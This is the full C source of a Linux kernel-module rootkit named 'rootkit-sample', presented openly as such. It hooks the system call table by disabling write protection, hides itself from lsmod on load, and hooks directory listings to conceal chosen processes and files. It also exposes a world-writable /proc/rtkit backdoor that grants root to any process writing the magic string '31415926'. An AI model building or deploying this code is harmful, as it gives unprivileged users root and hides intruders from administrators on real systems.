#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/delay.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>

#define CR0_WP 0x00010000   // Write Protect Bit (CR0:16)

MODULE_LICENSE("GPL");

#define MIN(a,b) \
({ typeof (a) _a = (a); \
typeof (b) _b = (b); \
_a < _b ? _a : _b; })

/* save this module's next node */
static struct list_head *this_module_next;

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry *proc_rtkit;

static int (*proc_readdir_orig)(struct file *, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static char module_status[1024];

#define MAX_PIDS 20
static char pids_to_hide[MAX_PIDS][8];
static int current_pids = 0;
static char hide_process = 1;
#define MAX_FILES 20
static char files_to_hide[MAX_FILES][PATH_MAX];
static int current_files = 0;
static char hide_file = 1;

/* address of system calls table */
static void **syscall_table;

/* find the address of system calls table */
unsigned long ** find_syscall_table(void);

/* save original address of sys_open */
static long (*orig_sys_open)(const char __user *filename, int flags, int mode);

/* hook sys_open to my_sys_open */
static long my_sys_open(const char __user *filename, int flags, int mode);

/* save original address of sys_umask */
static long (*orig_sys_umask)(int mask);

/* hook sys_umask to my_sys_umask */
/* my_sys_umask is used to deal with rootkit command */
#define CMD_STATUS -1	// get this module's status
#define CMD_SHOW -2	// show this module in lsmod
#define CMD_HIDE -3	// hide this module in lsmod
static long my_sys_umask(int mask);

/* module function */
static bool hidden_flag; // flag of this module's status: hidden or not
void module_hide(void);	// hide this module
void module_show(void);	// show this module

static void set_addr_rw(void *addr);	// set address to writeable
static void set_addr_ro(void *addr);	// set address to readonly

static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir);

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type);
static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir);

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data);
static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data);

static int procfs_init(void);
static void procfs_clean(void);

static int fs_init(void);
static void fs_clean(void);


unsigned long ** find_syscall_table(void)
{
	unsigned long ptr, *p;
	
	for(ptr=(unsigned long)sys_close; ptr<(unsigned long)&loops_per_jiffy; ptr+=sizeof(void *))
	{
		p = (unsigned long *)ptr;
		if(p[__NR_close] == (unsigned long)sys_close)
			return (unsigned long **)p;
	}
	return NULL;
}

static long my_sys_open(const char __user *filename, int flags, int mode)
{
	// printk("rootkit-sample: file %s has been opened with %d mode.\n", filename, mode);

	return orig_sys_open(filename, flags, mode);	
}

static long my_sys_umask(int mask)
{
        switch(mask)
        {
        case CMD_STATUS:
                break;
        case CMD_SHOW:  // show this module in lsmod
                module_show();
                break;
        case CMD_HIDE:  // hide this module in lsmod
                module_hide();
                break;
	default:
		break;
	}
	return orig_sys_umask(mask);
}

void module_hide(void)
{
	if(!hidden_flag)
        {
           list_del_init(&__this_module.list);
           kobject_del(&THIS_MODULE->mkobj.kobj);
           hidden_flag = true;
	}
}

void module_show(void)
{
	int ret;
	if(hidden_flag)
	{
		this_module_next->prev->next = (&__this_module.list);
		(&__this_module.list)->prev = this_module_next->prev;
		(&__this_module.list)->next = this_module_next;
		this_module_next->prev = (&__this_module.list);
	
		ret = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rootkit_sample");
	
		hidden_flag = false;
	}
}

static void set_addr_rw(void *addr)
{
	unsigned int level;
	pte_t *pte = lookup_address((unsigned long)addr, &level);
	if(pte->pte & (~_PAGE_RW))
		pte->pte |= _PAGE_RW;
}

static void set_addr_ro(void *addr)
{
        unsigned int level;
        pte_t *pte = lookup_address((unsigned long)addr, &level);
	pte->pte &= (~_PAGE_RW);
}

static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
	int i;
	if(hide_process)
	{
		for(i=0; i<current_pids; i++)
			if(!strncmp(name, pids_to_hide[i], MIN(7,namelen))) return 0;
	}
	if(hidden_flag && (!strncmp(name, "rtkit", MIN(5,namelen)))) return 0;
	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	proc_filldir_orig = filldir;
	return proc_readdir_orig(filp, dirent, proc_filldir_new);
}

static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
{
	int i;
	if(hide_file)
	{
		for(i=0; i<MAX_FILES; i++)
		{
			if(!strncmp(name, files_to_hide[i], MIN(namelen,PATH_MAX)))
				return 0;
		}
	}
	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
}

static int fs_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
{
	fs_filldir_orig = filldir;
	return fs_readdir_orig(filp, dirent, fs_filldir_new);
}

static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
{
	int size;
	sprintf(module_status,
"rootkit-sample\n\
\nCommands:\n\
hm   : hide module\n\
sm   : not hide module\n\
hf   : hide file\n\
sf   : not hide file\n\
hp   : hide process\n\
sp   : not hide process\n\
hf-X : hide file /X\n\
sf-X : not hide file /X\n\
hp-X : hide process with pid X\n\
sp-X : not hide process with pid X\n\
31415926 : change to root\n\
\nStatus:\n\
hide module  : %d\n\
hide file    : %d\n\
hide process : %d\n", hidden_flag, hide_file, hide_process);

	size = strlen(module_status);

	if(off > size)
		return 0;
	
	if(count >= size-off)
		memcpy(buffer, module_status+off, size-off);
	else
		memcpy(buffer, module_status+off, count);

	return size-off;
}

static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
{
	int i;
	if(!strncmp(buff, "31415926", MIN(8,count))) { // change to root
		struct cred *credentials = prepare_creds();
		credentials->uid = credentials->euid = 0;
		credentials->gid = credentials->egid = 0;
		commit_creds(credentials);
	} else if(!strncmp(buff, "hf-", MIN(3,count))) {
		if(current_files < MAX_FILES)
		{
			for(i=0; i<MAX_FILES; i++)
			{
				if(files_to_hide[i][0] == 0) {
					strncpy(files_to_hide[current_files], buff+3, MIN(count-3,PATH_MAX));
					current_files++;
					break;
				}
			}
		}
	} else if(!strncmp(buff, "sf-", MIN(2,count))) {
		for(i=0; i<MAX_FILES; i++)
		{
			if(!strncmp(files_to_hide[i], buff+3, MIN(count-3,PATH_MAX)))
			{
				memset(files_to_hide[i], 0, sizeof(files_to_hide[i]));
				current_files--;
				break;
			}
		}
	} else if(!strncmp(buff, "hp-", MIN(2,count))) {
		if(current_pids < MAX_PIDS) {
		for(i=0; i<MAX_PIDS; i++)
		{
			if(pids_to_hide[i][0] == 0) {
				strncpy(pids_to_hide[current_pids], buff+3, MIN(7,count-3));
				current_pids++;
				break;
			}
		}
		}
	} else if(!strncmp(buff, "sp-", MIN(3,count))){	// show process sp-XXX
		for(i=0; i<MAX_PIDS; i++)
		{
			if(!strncmp(pids_to_hide[i], buff+3, MIN(7,count-3)))
			{
				memset(pids_to_hide[i], 0, sizeof(pids_to_hide[i]));
				current_pids--;
				break;
			}
		}
	} else if(!strncmp(buff, "hm", MIN(2,count))) {	// hide this module
		module_hide();
	} else if(!strncmp(buff, "sm", MIN(2,count))) {	// not hide this module
		module_show();
	} else if(!strncmp(buff, "hf", MIN(2,count))) {	// hide files in files_to_hide
		hide_file = 1;
	} else if(!strncmp(buff, "sf", MIN(2,count))) { // not hide files in files_to_hide
		hide_file = 0;
	} else if(!strncmp(buff, "hp", MIN(2,count))) { // hide process in pids_to_hide
		hide_process = 1;
	} else if(!strncmp(buff, "sp", MIN(2,count))) { // not hide process in pids_to_hide
		hide_process = 0;
	}

	return count;
}

static int procfs_init(void)
{
	proc_rtkit = create_proc_entry("rtkit", 0666, NULL);
	if(NULL == proc_rtkit)
		return 0;
	proc_root = proc_rtkit->parent;
	if(NULL == proc_root || strncmp(proc_root->name, "/proc", 5) != 0)
		return 0;
	proc_rtkit->read_proc = rtkit_read;
	proc_rtkit->write_proc = rtkit_write;

	proc_fops = ((struct file_operations *)(proc_root)->proc_fops);
	proc_readdir_orig = proc_fops->readdir;
	set_addr_rw(proc_fops);
	proc_fops->readdir = proc_readdir_new;
	set_addr_ro(proc_fops);
	return 1;
}

static void procfs_clean(void)
{
	if(NULL != proc_rtkit)
	{
		remove_proc_entry("rtkit", NULL);
		proc_rtkit = NULL;
	}
	if(NULL != proc_fops && NULL != proc_readdir_orig)
	{
		set_addr_rw(proc_fops);
		proc_fops->readdir = proc_readdir_orig;
		set_addr_ro(proc_fops);
	}
}

static int fs_init(void)
{
	int i;
	struct file *root_filp;
	root_filp = filp_open("/", O_RDONLY, 0);
	if(NULL == root_filp)
		return 0;
	fs_fops = (struct file_operations *)(root_filp->f_op);
	filp_close(root_filp, NULL);

	fs_readdir_orig = fs_fops->readdir;
	set_addr_rw(fs_fops);
	fs_fops->readdir = fs_readdir_new;
	set_addr_ro(fs_fops);

	for(i=0; i<MAX_PIDS; i++)
		memset(pids_to_hide[i], 0, sizeof(pids_to_hide[i]));
	for(i=0; i<MAX_FILES; i++)
		memset(files_to_hide[i], 0, sizeof(files_to_hide[i]));

	return 1;
}

static void fs_clean(void)
{
	if(NULL != fs_fops && NULL != fs_readdir_orig)
	{
		set_addr_rw(fs_fops);
		fs_fops->readdir = fs_readdir_orig;
		set_addr_ro(fs_fops);
	}
}

static int __init lkm_init(void)
{
	unsigned long addr, cr0;

	// get the address of system calls table
	syscall_table = (void **)find_syscall_table();
	
	this_module_next = (&__this_module.list)->next;

	if(NULL == syscall_table)
	{
		printk("rootkit-sample: The address of system calls table not found.\n");
		return -1;
	}
	
	// save cr0
	cr0 = read_cr0();
	write_cr0(cr0 & (~CR0_WP));
	
	// make memory writeable, so that we can hook system calls
	addr = (unsigned long)syscall_table;
	if(set_memory_rw(PAGE_ALIGN(addr) - PAGE_SIZE, 3))
	{
		printk("rootkit-sample: Can't set the memory to rw at addr 0x%16lX\n", PAGE_ALIGN(addr) - PAGE_SIZE);
		write_cr0(cr0);
		return -1;
	}

	// hook sys_open system call
	orig_sys_open = syscall_table[__NR_open];
	syscall_table[__NR_open] = my_sys_open;
	
	// hook sys_umask
	orig_sys_umask = syscall_table[__NR_umask];
	syscall_table[__NR_umask] = my_sys_umask;

	// restore cr0
	write_cr0(cr0);

	// proc init
	procfs_init();
	
	// fs init
	fs_init();

	// hidden this module
	module_hide();

	return 0;
}

static void __exit lkm_exit(void)
{
	unsigned long cr0;
	
	// save cr0
        cr0 = read_cr0();
        write_cr0(cr0 & (~CR0_WP));

	// restore system calls
	syscall_table[__NR_open] = orig_sys_open;
	syscall_table[__NR_umask] = orig_sys_umask;

	// clean
	procfs_clean();
	fs_clean();

	// restore cr0
        write_cr0(cr0);
}

module_init(lkm_init);
module_exit(lkm_exit);
